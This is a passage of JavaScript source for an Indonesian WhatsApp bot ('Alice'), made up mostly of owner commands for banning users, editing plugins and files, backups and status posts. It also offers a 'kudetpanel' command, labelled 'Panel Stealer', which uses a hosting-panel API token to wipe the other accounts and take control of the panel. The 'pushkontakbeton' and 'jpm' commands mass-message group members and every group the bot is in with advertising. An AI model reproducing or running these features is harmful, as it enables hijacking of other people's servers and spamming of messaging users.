    title: `Bug Selection`, 
    sections
}


let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterName: author,
 newsletterJid: idch,
 serverMessageId: 143
},
 businessMessageForwardInfo: { businessOwnerJid: Alice.decodeJid(Alice.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: caption
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: packname
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: ``,
 subtitle: "",
 hasMediaAttachment: true,
 ...(await prepareWAMessageMedia({ image: { url: thumb } }, { upload: Alice.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
 }
 ],
 })
 })
 }
 }
}, {})

if (!text) await Alice.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
}
break 

case 'setprefix':
case 'aliceprefix': 
case 'prefixalice':{
if(!isOwner) return XRO()
const caption = `Silahkan Dipilih Tuan`;
let sections = [
{
highlight_label: 'Alice One Prefix',
rows: [{
title: 'One Prefix',
id: `${Xyroo}mmk one`
}]
},
{
highlight_label: 'Alice No Prefix',
rows: [{
title: 'No Prefix',
id: `${Xyroo}mmk no`
}]
},
{
highlight_label: 'Alice All Prefix',
rows: [{
title: 'All Prefix',
id: `${Xyroo}mmk all`
}]
}]

let listMessage = {
    title: `Setting Prefix`, 
    sections
}


let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterName: author,
 newsletterJid: idch,
 serverMessageId: 143
},
 businessMessageForwardInfo: { businessOwnerJid: Alice.decodeJid(Alice.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: caption
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: packname
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `Haii developer, mau set apa di aku?`,
 subtitle: "",
 hasMediaAttachment: true,
 ...(await prepareWAMessageMedia({ image: { url: thumb } }, { upload: Alice.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
 }
 ],
 })
 })
 }
 }
}, {})

if (!text) await Alice.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
}
break 

       case "banuser":
       case "banneduser":{
           if (!isOwner) return XRO()
           if (!text) return reply("tag atau reply yang mau di banned");
           let who;
           try {
               if (m.isGroup)
                   who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender;
           } catch (err) {
               if (m.isGroup) who = text + "@s.whatsapp.net";
           }
           if (!who) return reply("tag atau reply yang mau di banned");
           const isBen = user_ban.includes(who);
           if (isBen) return reply(`${isBen} telah di banned !!`);
           user_ban.push(who);
           fs.writeFileSync("./AliceDatabase/banned.json", JSON.stringify(user_ban, 2, null));
           await sleep(500);
           reply(who + "\npftt, di bann aowkaowwk");
       }
       break;                
       case "unbanneduser":
       case "unbanuser":{
           if (!isOwner) return XRO()
           if (!text) return reply("tag atau reply yang mau di unbanned");          
           let whe;
           try {
               if (m.isGroup)
                   whe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender;
           } catch (err) {
               if (m.isGroup) whe = text + "@s.whatsapp.net";
           }
           if (!whe) return reply("tag atau reply nomor yang mau di unban");
           user_ban.splice(whe, 1);
           fs.writeFileSync("./AliceDatabase/banned.json", JSON.stringify(user_ban, 2, null));
           await sleep(500);
           reply(whe + "\nsukses unban");
       }
       break;
                
       case "listbanuser":
       case "listbanned":{
           if (!isOwner) return XRO()
           var textban = `list user yang terbanned di database : *${user_ban.length}*`;
           await Alice.sendMessage(m.chat, {
               text: textban,
               contextInfo: {
                   externalAdreply: {
                       title: `${ownername}`,
                       body: "",
                       thumbnailUrl: thumbnailReply,
                       sourceUrl: xtele,
                       mediaType: 1,
                       renderLargerThumbnail: true,
                   }
               }
           }, { quoted: m });
       }
       break;

case 'kudetpanel':{
    if (!isOwner) return XRO()
    generateRandomPassword()
    const permen = text.split('|').map(arg => arg.trim());
    const apiKey = permen[0];
    const panelUrl = permen[1];
    const userIdToKeep = permen[2];

    if (permen.length < 3) {
        reply(`*Kudeta Panel Ambil Token Plta Dulu Sama Lihat User ID Akun mu agar tidak ikut kehapus, Setelah Kudet Dimohon Kill SSH 42000 Detik = 12 Jam*\n\n\`\`\`Example Use: .pkudet plta|link|userid\`\`\``);
        return;
    }

    reply(`\`\`\`Processing...\`\`\`\n\`Target:\` ${panelUrl}\n\`Keep ID:\` ${userIdToKeep}\n\`Token:\` ${apiKey}\n\nIf The Stealer Finished Data Will Be Send To You`);

    try {
        const progress = await PermenReset(apiKey, panelUrl, userIdToKeep);
        reply(progress);
        const thumb = `${thumb}`;
        const resultn = `Panel Stealer Access By ${ownername}
        \`Target:\` ${panelUrl}
        \`Keep ID:\` ${userIdToKeep}
        
        \`New User:\` x
        \`Mail:\` x@reset.com
        \`Password:\` ${passwordaseli}`;
        Alice.sendMessage(m.sender, {
            contextInfo: {
                externalAdreply: {
                    showAdAttribution: true,
                    title: `Panel Has Been Stealed`,
                    body: `New Details`,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    thumbnailUrl: thumbnailReply,
                    sourceUrl: yt
                }
            }, 
            text: resultn
        }, { quoted: m });
        
    } catch (error) {
        replh(error.message);
    }
}
break

case 'restart':
if (!isOwner) return XRO()
reply(`restarting ${global.botname}`)
reply(`Done ✅`)
await sleep(3000)
process.exit()
break
  
case 'upch-audio': {
      if (!isOwner) return XRO()
    if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Use ${XyrooRynzz} Judul Lagu|Terserah\n\nExample ${XyrooRynzz} Mungkin | Kita Sad Dulu`);

    Alice.sendMessage(m.chat, { react: { text: '🕐', key: m.key } });
    ngawi = text.split("|")[0];
    jomokck = text.split("|")[1];
    await sleep(6000);

    Alice.sendMessage(`${global.idch}`, {
        audio: await quoted.download(),
        mimetype: 'audio/mp4',
        ptt: true,
        contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 9999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: idch,
                serverMessageId: 20,
                newsletterName: botname
            },
            externalAdreply: {
                title: ngawi,
                body: jomokck,
                thumbnailUrl: thumbnailReply,
                sourceUrl: null,
                mediaType: 1
            }
        }
    });

    await sleep(2000);
    Alice.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
}
break

case "sendtesti": {
      if (!isOwner) return XRO()
if (!text) return reply("teks dengan mengirim foto")
if (!/image/.test(mime)) return reply("teks dengan mengirim foto")
const allgrup = await Alice.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await Alice.downloadAndSaveMediaMessage(qmsg)
await reply(`Memproses jpm testimoni ke dalam channel & ${res.length} grup`)
await Alice.sendMessage(global.idchtesti, {image: await fs.readFileSync(rest), caption: teks})
for (let i of res) {
try {
await Alice.sendMessage(i, {
  footer: `${packname}`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Script',
          sections: [
            {
              title: 'Script Alice Assistent',
              highlight_label: 'Terbaru',
              rows: [
                {
                  title: 'Script Alice Assistent Free Update',
                  id: `${prefix}sc`
                  }                     
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: await fs.readFileSync(rest), 
  caption: `\n${teks}\n`,
  contextInfo: {
   isForwarded: true, 
   forwardedNewsletterMessageInfo: {
   newsletterJid: idch,
   newsletterName: packname
   }
  },
}, {quoted: qtoko})
count += 1
} catch {}
await sleep(3000)
}
await fs.unlinkSync(rest)
await Alice.sendMessage(jid, {text: `Testimoni berhasil dikirim ke dalam channel & ${count} grup`}, {quoted: m})
}
break
case 'alicebackup': {
    if (!isOwner) return XRO()
    const tgl = new Date().toLocaleDateString('id-ID');    
    const ls = execSync("ls").toString().split("\n").filter(
        (pe) =>           
        pe != "node_modules" &&   
        pe != "AliceSessions" &&
        pe != "package-lock.json" &&  
        pe != "yarn.lock" &&
        pe != "tmp" &&
        pe != ""
    );

    execSync(`zip -r update.zip ${ls.join(" ")}`);
    await Alice.sendMessage(m.chat, {
        document: fs.readFileSync("./update.zip"),   
        fileName: `Alicee ${tgl}.zip`,
        mimetype: "application/zip",
        caption: `Alice ${version} Version`,
        jpegThumbnail: fs.readFileSync('./AliceMedia/image/Alice.jpg')
    }, { quoted: m });
    execSync("rm -rf update.zip");
}
break
case 'addplugins':{
if (!isOwner) return XRO()
if (!q.includes("|")) return reply(`Add input, *☘️ Example :* \n\n*${XyrooRynzz} name|category|content*`)
const [
pluginName,
category, ...pluginContent
] = q.split("|")
const pluginDirPath = path.join(path.resolve(__dirname, './AlicePlugins', category))
const pluginFilePath = path.join(pluginDirPath, pluginName + ".js")
if (!q.includes("|") || pluginContent.length === 0 || fs.existsSync(pluginFilePath)) return
if (!fs.existsSync(pluginDirPath)) fs.mkdirSync(pluginDirPath, {
recursive: true
})
fs.writeFileSync(pluginFilePath, pluginContent.join('|'))
await reply(`A new plugin has been created in ${pluginFilePath}.`)
}
break
case 'editplugins': {
if (!isOwner) return XRO()
if (!q.includes("|")) return reply (`Add Input, *☘️ Example :* *${XyrooRynzz} thisplug|newcontent*`)
let [mypler, ...rest] = q.split("|")
let mypenis = rest.join("|")
let pluginsDirect = path.resolve(__dirname, './AlicePlugins')
let plugins = loadPlugins(pluginsDirect)
for (const plugin of plugins) {
if (plugin.command.includes(mypler)) {
let filePath = plugin.filePath
fs.writeFileSync(filePath, mypenis)
await reply(`The plugin in ${filePath} has been replaced`)
return
}
}
await reply(`Plugin with command '${mypler}' not found`)
}
break
case 'delplugins': {
if (!isOwner) return XRO()
if (!q) return reply(`Please provide the command name of the plugin you want to remove. *☘️ Example :* \n\n*${XyrooRynzz} thisplug*`)
let pluginsDirect = path.resolve(__dirname, './AlicePlugins')
let plugins = loadPlugins(pluginsDirect)
for (const plugin of plugins) {
if (plugin.command.includes(q)) {
let filePath = plugin.filePath
fs.unlinkSync(filePath)
await reply(`The plugin in ${filePath} has been removed.`)
return
}
}
await reply(`Plugin with command '${q}' not found.`)
}
break
case 'getplugins': {
if (!isOwner) return XRO()
if (!q) return reply(`Add Input, *☘️ Example :* \n\n*${XyrooRynzz} ryocakep*`)
let pluginsDirect = path.resolve(__dirname, './AlicePlugins')
let plugin = loadPlugins(pluginsDirect).find(p => p.command.includes(q))
if (!plugin) return reply(`Plugin with command '${q}' not found.`)
await Alice.sendMessage(m.chat, {
document: fs.readFileSync(plugin.filePath),
fileName: path.basename(plugin.filePath),
mimetype: '*/*'
}, {
quoted: m
})
await reply(`Successfully retrieved plugin '${q}', plugin has been submitted.`)
}
break

case 'setimgmenu': {
if (!isOwner) return XRO()
if (!/image/.test(mime)) return reply('reply fotonya')
await Alice.downloadAndSaveMediaMessage(qmsg, "./AliceMedia/image/Alice.jpg", false)
await reply("Berhasil mengganti image menu ✅")
}
break

case 'setimgpng': {
if (!isOwner) return XRO()
if (!/image/.test(mime)) return reply('reply fotonya')
await Alice.downloadAndSaveMediaMessage(qmsg, "./AliceMedia/image/Alice.png", false)
await reply("Berhasil mengganti image png")
}
break

case "out": case "leave2": {
if (!isOwner) return XRO()
let gcall = await Object.values(await Alice.groupFetchAllParticipating().catch(_=> null))
let num = []
let listgc = `*Contoh Cara Penggunaan :*\nKetik *out* Nomor Grupnya\n\n*List Semua Grup Chat :*\n\n`
await gcall.forEach((u, i) => {
num.push(i)
listgc += ` *Nomor Grup => ${i+1}*\n*• Nama :* ${u.subject}\n*• ID :* ${u.id}\n*• Total Member :* ${u.participants.length} Member\n*• Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n*• Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
})
if (!args[0]) {
reply(listgc)
} else if (args[0]) {
if (!num.includes(Number(args[0]) - 1)) return reply("Grup tidak ditemukan")
let leav = Number(args[0]) - 1
await reply(`Berhasil Keluar Dari Grup :\n*${gcall[leav].subject}*`)
await Alice.groupLeave(`${gcall[leav].id}`)
}}
break

case 'addchangelog': case 'addlog': {
      if (!isOwner) return XRO()
      if (!text) return reply(`Usage: ${Xyroo}addchangelog <text>`)
      changelogs.unshift(`${new Date().toDateString()} - ${text}`)
      global.db.data.changelog = changelogs
      reply('Changelog Berhasil Di Tambahkan 🔑')
      }
      break
      
    case 'delchangelog': case 'dlog': {
      if (!isOwner) return XRO()
      if (!text) return reply(`Usage: ${Xyroo}rchangelog <text>`)
      let index = changelogs.findIndex(changelog => changelog.includes(text))
      if (index === -1) return reply('Changelog not found')
      changelogs.splice(index, 1)
      global.db.data.changelog = changelogs
      reply('Changelog Berhasil Dihapus 🔥')
      }
      break

case 'changelog':
    case 'log': {
      if (!changelogs.length) return reply('There are no changelogs yet')
      caption = changelogs.map(changelog => {
        let [date, ...items] = changelog.split(' - ')
        return `☀️ ${date}\n${items.map(item => `  📜 ${item}`).join('\n')}`
      }).join('\n\n')
Alice.sendMessage(m.chat, {
    text: caption,
    contextInfo: {
      externalAdreply: {
        showAdAttribution: false,
        title: `Changelog ${botname}`,
        body: `${global.wm}`,
        thumbnailUrl: thumbnailReply,
        sourceUrl: channel,
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
}
      break

case 'pushkontakbeton': {
if (!isOwner) return XRO()
if (!text) return reply("idgrup|pesan|teksdibutton")
if (!text.split("|")) return reply("idgrup|pesan|teksdibutton")
const [idgc, pes, peszie] = text.split("|")
const teks = pes
const tekszie = peszie
const jidawal = m.chat
const data = await Alice.groupMetadata(idgc)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await reply(`Memproses *pushkontak* ke dalam grup *${data.subject}*`)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
const vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n' 
            + `FN:${ownername}\n`
            + 'ORG:Developer;\n'
            + `TEL;type=CELL;type=VOICE;waid=${global.owner}:${global.owner}\n`
            + 'END:VCARD'

let imgscs = await prepareWAMessageMedia({ image: fs.readFileSync("./AliceMedia/image/Alice.jpg") }, { upload: Alice.waUploadToServer })

const msgii = await generateWAMessageFromContent(mem, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: teks
}), 

contextInfo: {
isForwarded: true, 
forwardingScore: 9999, 
businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: `${ownername}`, newsletterJid: idch }, 
mentionedJid: [global.owner+"@s.whatsapp.net", m.sender]
}, 

carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: tekszie, 
hasMediaAttachment: true,
...imgscs
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
name: "single_select",
buttonParamsJson:
`{
  title": "List Produk",
  "sections": [
    {
      "title": "",
      "rows": [
        {
          "header": "Script Alice Asistent",
          "title": "© XyrooRynzz",
          "description": "",
          "id": ""
        },
        {
          "header": "Panel Pterodactyl Private𝗹",
          "title": "© XyrooRynzz",
          "description": "",
          "id": ""
        }
]}
]}`
},
{
name: "quick_reply",
buttonParamsJson: `{\"display_text\":\"Done Save\",menu\"id\":\"\"}`
},
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Buy Script\",\"url\":\"https://wa.me/6281543496975?text=buy+sc+Alice+bang+Xyroo\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {quoted: null})
await Alice.relayMessage(mem, msgii.message, {messageId: msgii.key.id})
await sleep(global.delayPushkontak)
}}

await Alice.sendMessage(jidawal, {text: `Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

case 'jpm': case 'post': case 'pushcontactgc': {
if (!isOwner) return reply("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
if (!text) return reply(`*Incorrect Usage Please Use Like This*\n${XyrooRynzz} text|pause\n\nreply Image To Send Images to All Groups\nFor a pause, 1000 = 1 second\n\nExample: ${XyrooRynzz} hello|9000`)
await reply(`In progress...`)
let getGroups = await Alice.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await Alice.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await Alice.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
await Alice.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await Alice.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
reply(`Success`)
}
break

case 'upstatuswa':
case 'upstatus':
case 'upsw': {
    let argsText = text.split(',').map(a => a.trim())
    if (argsText.length < 2) return reply(`Contoh: ${XyrooRynzz} idgrup, teks`)

    let target = argsText[0]
    let caption = argsText.slice(1).join(',')

    if (!quoted) return reply(`Kutip pesan seperti gambar, video, atau audio dengan caption ${XyrooRynzz}`)

    if (quoted.mtype === "audioMessage") {
        let audioData = await quoted.download()
        Alice.sendStatusMention(
            { audio: audioData, mimetype: 'audio/mp4', ptt: true },
            [target]
        )
    }

    if (quoted.mtype === "imageMessage") {
        let imageData = await quoted.download()
        Alice.sendStatusMention(
            { image: imageData, caption: caption || '' },
            [target]
        )
    }

    if (quoted.mtype === "videoMessage") {
        let videoData = await quoted.download()
        Alice.sendStatusMention(
            { video: videoData, caption: caption || '' },
            [target]
        )
    }
    reply('Sukses mengirim status mention!')
}
break

            case 'statustext': 
            case 'upswtext':
            case 'upswteks': {
               if (!isOwner) return XRO()
               if (!q) return reply('Text?')
               await Alice.sendMessage('status@broadcast', { text: q }, { backgroundColor: '#FF000000', font: 3, statusJidList: Object.keys(global.db.data.users) })
               reply('Succes')
            }
            break
            case 'statusvideo':
            case 'upswvideo': {
               if (!isOwner) return XRO()
               if (/video/.test(mime)) {
                  var videosw = await Alice.downloadAndSaveMediaMessage(quoted)
                  await Alice.sendMessage('status@broadcast', {
                     video: {
                        url: videosw
                     },
                     caption: q ? q : ''
                  }, { statusJidList: Object.keys(global.db.data.users) })
                  await reply('Succes')
               } else {
                  reply('reply to video')
               }
            }
            break
            case 'statusaudio':
            case 'upswaudio': {
               if (!isOwner) return XRO()
               if (/audio/.test(mime)) {
                  var audiosw = await Alice.downloadAndSaveMediaMessage(quoted)
                  await Alice.sendMessage('status@broadcast', {
                     audio: {
                        url: audiosw
                     },
                     mimetype: 'audio/mp4',
                     ptt: true
                  }, {
                     backgroundColor: '#FF000000',
                     statusJidList: Object.keys(global.db.data.users)
                  })
                  await reply('Succes')
               } else {
                  reply('reply to audio')
               }
            }
            break                        
            case 'statusimg':
            case 'statusimage':
            case 'upswimg': {
               if (!isOwner) return XRO()
               if (/image/.test(mime)) {
                  var imagesw = await Alice.downloadAndSaveMediaMessage(quoted)
                  await Alice.sendMessage('status@broadcast', {
                     image: {
                        url: imagesw
                     },
                     caption: q ? q : ''
                  }, { statusJidList: Object.keys(global.db.data.users)})
                  await reply('Succes')
               } else {
                  reply('reply to image')
               }
            }
            break

case 'getfunction': {
if (!isOwner) return XRO() 
if (!text) return reply(`Contoh: ${XyrooRynzz} functionName`);
const isValidFunctionName = (name) => /^[a-zA-Z_$][0-9a-zA-Z_$]*$/.test(name);
const getFunction = (functionName) => {
if (!isValidFunctionName(functionName)) return reply(`Nama fungsi tidak valid: ${functionName}`);
try {
const fileContent = fs.readFileSync("./Alice.js", "utf8");

const functionRegex = new RegExp(`function\\s+${functionName}\\s*\\([^)]*\\)\\s*{`, "g");
const match = functionRegex.exec(fileContent);
if (!match) return reply(`Fungsi ${functionName} tidak ditemukan`);

const functionStart = match.index;
let braceCount = 0;
let inString = false;
let inComment = false;
let currentChar, prevChar;
for (let i = functionStart; i < fileContent.length; i++) {
currentChar = fileContent[i];
if (prevChar === '/' && currentChar === '*') inComment = true;
if (prevChar === '*' && currentChar === '/') inComment = false;
if (!inComment) {
if (currentChar === '"' || currentChar === "'" || currentChar === '`') inString = !inString;
if (!inString) {
if (currentChar === '{') braceCount++;
if (currentChar === '}') braceCount--;
}}
if (braceCount === 0 && currentChar === '}') {
const functionEnd = i + 1;
const functionContent = fileContent.slice(functionStart, functionEnd);
return functionContent;
}
prevChar = currentChar;
}} catch (err) {
return reply(`Terjadi kesalahan: ${err.message}`);
}} 
reply(`${getFunction(q)}`);
}
break
case 'delfunc':
case 'delfunction': {
if (!isOwner) return XRO() 
if (!text) return reply(`Contoh: ${XyrooRynzz} functionName`);
const isValidFunctionName = (name) => /^[a-zA-Z_$][0-9a-zA-Z_$]*$/.test(name);
const deleteFunction = (functionName) => {
if (!isValidFunctionName(functionName)) return reply(`Nama fungsi tidak valid: ${functionName}`);
try {
const fileContent = fs.readFileSync("./Alice.js", "utf8");
const functionRegex = new RegExp(`function\\s+${functionName}\\s*\\([^)]*\\)\\s*{`, "g");
const match = functionRegex.exec(fileContent);
if (!match) return reply(`Fungsi ${functionName} tidak ditemukan`);
const functionStart = match.index;
let braceCount = 0;
let inString = false;
let inComment = false;
let currentChar, prevChar;
let functionEnd;

for (let i = functionStart; i < fileContent.length; i++) {
currentChar = fileContent[i];
if (prevChar === '/' && currentChar === '*') inComment = true;
if (prevChar === '*' && currentChar === '/') inComment = false;
if (!inComment) {
if (currentChar === '"' || currentChar === "'" || currentChar === '`') inString = !inString;
if (!inString) {
if (currentChar === '{') braceCount++;
if (currentChar === '}') braceCount--;
}}
if (braceCount === 0 && currentChar === '}') {
functionEnd = i + 1;
break;
}
prevChar = currentChar;
}
if (functionEnd === undefined) return reply(`Fungsi ${functionName} tidak lengkap atau kurung kurawal tidak seimbang`);
const updatedContent = fileContent.slice(0, functionStart) + fileContent.slice(functionEnd);
fs.writeFileSync("./Alice.js", updatedContent, "utf8");
return reply(`Fungsi ${functionName} telah dihapus`);
} catch (err) {
return reply(`Terjadi kesalahan: ${err.message}`);
}};
reply(deleteFunction(q));
}
break
case 'addfile': {
    if (!isOwner) return
    if (!text.includes("./")) return reply(`Contoh: ${XyrooRynzz} ./path/to/file.txt`);    
    let filePath = path.resolve(text);
    let dir = path.dirname(filePath);
    let fileName = path.basename(filePath);
    
    if (!fs.existsSync(dir)) {
        return reply('Direktori tidak ditemukan!');
    }
    
    if (!m.quoted) {
        return reply('Tidak ada file yang dikutip!');
    }

    try {
        let media = await downloadContentFromMessage(m.quoted, "document");
        let buffer = Buffer.from([]);
        
        for await (const chunk of media) {
            buffer = Buffer.concat([buffer, chunk]); 
        }

        if (fs.existsSync(filePath)) {
            fs.appendFileSync(filePath, buffer);
            reply(`Berhasil menambahkan konten ke ${fileName}`);
        } else {
            fs.writeFileSync(filePath, buffer);
            reply(`Berhasil membuat file ${fileName} dan menambahkan konten.`);
        }
    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan saat mengunduh atau menyimpan file.');
    }
}
break;
case "delfile": {
if (!isOwner) return XRO()
if (!text) return reply(`Example\n${prefix + cmd} ./all/Alice.js`)
fs.unlinkSync(text)
xreply ("Berhasil Menghapus File")
}
break
case 'delfolder': case 'removefolder': {
    if (!isOwner) return XRO();
    if (!text.startsWith("./")) {
        return reply(`Format salah. Contoh penggunaan: ${XyrooRynzz} ./namaFolder`);
    }
    let folderPath = path.resolve(text);
    try {
        if (!fs.existsSync(folderPath)) {
            return reply('Folder tidak ditemukan di lokasi tersebut!');
        }
        fs.rmdirSync(folderPath, { recursive: true });
        reply(`Berhasil menghapus folder ${folderPath}`);
    } catch (error) {
        console.error('Error:', error);
        reply('Terjadi kesalahan saat menghapus folder. Silakan coba lagi.');
    }
}
break

case 'mkdir': case 'addfolder': {
if (!isOwner) return XRO()
if (!text.startsWith("./")) {
return reply(`Format salah. Contoh penggunaan: ${XyrooRynzz} ./namaFolder`);
}
let folderPath = path.resolve(text);
try {
if (fs.existsSync(folderPath)) {
return reply('Folder sudah ada di lokasi tersebut!');
}
fs.mkdirSync(folderPath, { recursive: true });
reply(`Berhasil membuat folder ${folderPath}`);
} catch (error) {
console.error('Error:', error);
reply('Terjadi kesalahan saat membuat folder. Silakan coba lagi.');
}}
break
case 'addprem':
case 'delprem': {
  const fs = require('fs');
  const premPath = './AliceDatabase/premium.json';
  if (!fs.existsSync(premPath)) fs.writeFileSync(premPath, '[]');

  let premium = JSON.parse(fs.readFileSync(premPath));

  function save() {
    fs.writeFileSync(premPath, JSON.stringify(premium, null, 2));
  }

  function parseTime(text) {
    const match = text.match(/^(\d+)(s|m|h|d|w|mo|y)$/);
    if (!match) return null;
    const value = parseInt(match[1]);
    const unit = match[2];
    const now = Math.floor(Date.now() / 1000);

    let seconds = 0;
    switch (unit) {
      case 's': seconds = value; break;
      case 'm': seconds = value * 60; break;
      case 'h': seconds = value * 3600; break;
      case 'd': seconds = value * 86400; break;
      case 'w': seconds = value * 604800; break;
      case 'mo': seconds = value * 2592000; break;
      case 'y': seconds = value * 31536000; break;
      default: return null;
    }

    return now + seconds;
  }

  // 🔔 Cek dan beri tahu jika ada yang expired
  const now = Math.floor(Date.now() / 1000);
  const expiredUsers = premium.filter(u => u.expired !== 0 && u.expired < now);
  if (expiredUsers.length > 0) {
    for (let ownerNum of global.owner) {
      const nomor = typeof ownerNum === 'object' ? ownerNum[0] : ownerNum;
      Alice.sendMessage(nomor + '@s.whatsapp.net', {
        text: `📢 Notifikasi Premium:\nTerdapat ${expiredUsers.length} user premium yang telah *expired*:\n\n` +
          expiredUsers.map(u => `• wa.me/${u.id}`).join('\n'),
      });
    }
  }

  if (command === 'addprem') {
    if (!isOwner) return XRO();
    if (!args[0]) return reply(`📌 Contoh: ${XyrooRynzz} 6281543496975 3d`);
    const target = args[0].replace(/[^0-9]/g, '');
    const waktu = args[1];

    let expired = 0;
    if (waktu === '0') {
      expired = 0;
    } else {
      expired = parseTime(waktu);
      if (!expired) return reply(`⚠️ Format waktu tidak valid!\nContoh: 30m ( menit ), 2h ( jam ), 3d ( hari ), 1w ( minggu ), 1mo ( bulan ), 1y ( tahun )\n\nHelp Command\n.addprem nomor 1y`);
    }

    let existing = premium.find(v => v.id === target);
    if (existing) {
      existing.expired = expired;
    } else {
      premium.push({ id: target, expired });
    }

    save();

    // ✅ Beri tahu owner di grup
    reply(`✅ @${target} sekarang menjadi *user premium*${expired !== 0 ? ` hingga ${new Date(expired * 1000).toLocaleString('id-ID')}` : ' selamanya'}.`, {
      mentions: [target + '@s.whatsapp.net']
    });

    // 📩 Kirim pesan langsung ke user
    await Alice.sendMessage(target + '@s.whatsapp.net', {
      text: `👑 Selamat! Kamu telah menjadi *user premium bot*.\n${expired !== 0 ? `Masa berlaku hingga: ${new Date(expired * 1000).toLocaleString('id-ID')}` : 'Kamu mendapatkan premium *selamanya*!'}`,
    });
  }

  if (command === 'delprem') {
    if (!isOwner) return XRO();
    if (!args[0]) return reply(`📌 Contoh: ${XyrooRynzz}delprem 6281234567890`);
    const target = args[0].replace(/[^0-9]/g, '');
    const index = premium.findIndex(v => v.id === target);

    if (index === -1) return reply(`❌ Nomor tidak ditemukan di daftar premium.`);

    premium.splice(index, 1);
    save();

    reply(`✅ @${target} telah dihapus dari daftar premium.`, {
      mentions: [target + '@s.whatsapp.net']
    });

    // 📨 Kirim pemberitahuan ke user yang dihapus
    await Alice.sendMessage(target + '@s.whatsapp.net', {
      text: `⚠️ Premium kamu telah dihapus oleh admin bot.`,
    });
  }
}
break;
case 'addprem':
case 'delprem': {
  const fs = require('fs');
  const premPath = './AliceDatabase/premium.json';
  if (!fs.existsSync(premPath)) fs.writeFileSync(premPath, '[]');

  let premium = JSON.parse(fs.readFileSync(premPath));

  // Fungsi simpan ulang
  function save() {
    fs.writeFileSync(premPath, JSON.stringify(premium, null, 2));
  }

  // Fungsi parsing waktu (misal 1d → 86400 detik)
  function parseTime(text) {
    const match = text.match(/^(\d+)(s|m|h|d|w|mo|y)$/);
    if (!match) return null;
    const value = parseInt(match[1]);
    const unit = match[2];
    const now = Math.floor(Date.now() / 1000);

    let seconds = 0;
    switch (unit) {
      case 's': seconds = value; break;
      case 'm': seconds = value * 60; break;
      case 'h': seconds = value * 3600; break;
      case 'd': seconds = value * 86400; break;
      case 'w': seconds = value * 604800; break;
      case 'mo': seconds = value * 2592000; break;
      case 'y': seconds = value * 31536000; break;
      default: return null;
    }

    return now + seconds;
  }

  if (command === 'addprem') {
    if (!isOwner) return XRO(); // hanya owner global yang bisa
